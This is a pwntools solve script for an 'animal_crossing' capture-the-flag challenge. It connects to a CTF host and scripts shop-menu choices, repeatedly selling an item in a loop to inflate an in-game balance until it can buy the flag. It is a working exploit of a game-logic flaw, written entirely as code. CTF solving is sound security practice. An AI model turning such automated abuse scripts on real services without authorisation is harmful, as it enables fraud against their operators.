from pwn import *

# p = process('./animal_crossing')
p = remote('ctf.umbccd.io', 4400)
flag = 420000

print(p.recvuntil('Choice:'))        
print(p.sendline('1'))
print(p.recvuntil('for digging yourself out of debt Price: 800 bells'))
print(p.sendline('3'))

print(p.recvuntil('Choice:'))
print(p.sendline('2'))
print(p.recvuntil('flag - 420000 bells'))
print(p.sendline('1'))

print(p.recvuntil('Choice:'))
print(p.sendline('1'))
print(p.recvuntil('for digging yourself out of debt Price: 800 bells'))
print(p.sendline('2'))

print(p.recvuntil('Choice:'))
print(p.sendline('1'))
print(p.recvuntil('for digging yourself out of debt Price: 800 bells'))
print(p.sendline('2'))

print(p.recvuntil('Choice:'))
print(p.sendline('1'))
print(p.recvuntil('for digging yourself out of debt Price: 800 bells'))
print(p.sendline('1'))

print(p.recvuntil('Choice:'))
print(p.sendline('1'))
print(p.recvuntil('for digging yourself out of debt Price: 800 bells'))
print(p.sendline('3'))

print(p.recvuntil('Choice:'))
print(p.sendline('1'))
print(p.recvuntil('for digging yourself out of debt Price: 800 bells'))
print(p.sendline('3'))

print(p.recvuntil('Choice:'))
print(p.sendline('1'))
print(p.recvuntil('for digging yourself out of debt Price: 800 bells'))
print(p.sendline('3'))

print(p.recvuntil('Choice:'))
print(p.sendline('1'))
print(p.recvuntil('for digging yourself out of debt Price: 800 bells'))
print(p.sendline('3'))

print(p.recvuntil('Choice:'))
print(p.sendline('1'))
print(p.recvuntil('for digging yourself out of debt Price: 800 bells'))
print(p.sendline('4'))

balance = 900 + 800 + 800 + 800 + 400*4

while 1:
    p.recvuntil('Choice:')
    p.sendline('1')
    p.recvuntil('a great way to catch bugs! Price: 400 bells')
    p.sendline('3')
    balance += 400
    print(balance)
    if(balance >= flag):
        p.recvuntil('Choice:')
        p.sendline('2')
        p.recvuntil('a great way to catch bugs! Price: 400 bells')
        p.sendline('6')
        p.interactive()
        # print(p.recvuntil('Choice:'))




p.interactive()

# 3 2 2 1 3 3 3 3 4 3333

# kareeda 1